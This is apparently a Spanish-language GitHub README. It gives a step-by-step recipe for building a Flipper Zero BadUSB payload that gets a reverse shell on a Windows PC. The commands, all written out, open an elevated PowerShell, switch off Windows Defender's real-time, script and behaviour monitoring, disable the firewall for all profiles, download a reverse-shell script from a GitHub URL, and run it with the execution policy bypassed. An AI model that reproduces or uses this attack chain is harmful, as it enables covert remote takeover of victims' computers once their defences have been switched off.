# PASOS PARA INYECTAR UNA REVERSESHELL EN UN EQUIPO DESDE UN FLIPPER ZERO.

1. Crea una reverseshell desde 0, o hazla en la página https://www.revshells.com/. 





1. Crea un archivo TXT compuesto por DELAYS, ENTERS Y STRINGS adecuandolos a tu gusto. (Tienes el ejemplo en el proyecto de una reverseshell creada por mi).





1.  DELAY = La función que hace que el procesador espere "delay(1000); //provoca un retardo de 1000ms = 1 segundo".
2.  ENTER = Simula la acción de la tecla Intro del teclado.
3.  STRING = Se trata de una secuencia de caracteres usados para representar el texto.

1.  Sabiendo esto, vamos a empezar a programar nuestro txt.





 1.  Con este comando en String abrimos la pestaña de Ejecutar.
      ```sh g
      GUI r
      ```



 1.  Abrimos Powershell.
      ```sh g
      powershell
      ```
 1.  Lo ejecutamos como administrador.
      ```sh g
      CTRL-SHIFT ENTER
      ```

 1.  Le damos a que sí cuando nos pregunte si queremos abrirlo como administrador.
      ```sh g
      ALT s
      ```
 1.  Utilizamos este String para para deshabilitar el Windows Defender.
      ```sh g
      powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -  
      DisableIntrusionPreventionSystem $true'
      ```
 1.  Desactivamos el Firewall.
      ```sh g
      Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
      ```
 1.  Descargamos el ReverseShell con el String Invoke-WebRequest (Yo en mi caso lo tengo alojado en github).
      ```sh g
      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/alvaroarenas69/scrips-powershell/main/reverseshell.ps1" -OutFile "reverseshell.ps1"
      ```
 1.  Ejecutamos el ReverseShell.
      ```sh g
      powershell -ExecutionPolicy Bypass -File ".\reverseshell.ps1"
      ```
 1.  Una vez creado el txt, lo guardamos. Conectamos el Flipper al PC mediante la aplicación qflipper, que podemos descargar en el siguiente      enlace: https://flipperzero.one/update
 2.  Dentro de la aplicación, buscamos el fichero Read File y pegamos el txt en la carpeta BADUSB.

    
     ![imagen](https://github.com/90l3m0np13/Reverse-Zero/blob/main/im%C3%A1genes/badusb.png)
 4.  Y por último, solo queda ejecutar el Scrip que hemos creado desde el flipper zero.


















